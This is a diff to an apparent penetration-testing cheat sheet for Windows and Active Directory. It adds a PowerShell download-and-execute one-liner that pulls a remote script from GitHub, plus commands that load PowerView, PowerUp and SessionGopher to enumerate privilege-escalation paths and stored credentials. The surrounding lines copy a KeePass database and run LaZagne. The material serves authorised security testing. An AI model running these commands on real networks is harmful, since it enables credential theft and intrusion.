@@ -81,6 +81,12 @@ copy z:\PowerUpSQL.ps1 .
 copy Database.kdbx z:\
 ```
 
+Import ADModule.
+
+```bash
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+```
+
 Execute powershell file non-interactively.
 
 ```bash
@@ -139,6 +145,12 @@ Automated tools.
 ```bash
 .\winpeas.exe searchall domain
 .\LaZagne.exe all
+. .\PowerView.ps1
+. .\PowerUp.ps1
+. .\Invoke-SessionGopher.ps1
+.\amorous.ps1
+Invoke-AllChecks
+Invoke-SessionGopher -Thorough
 ```
 
 ```bash
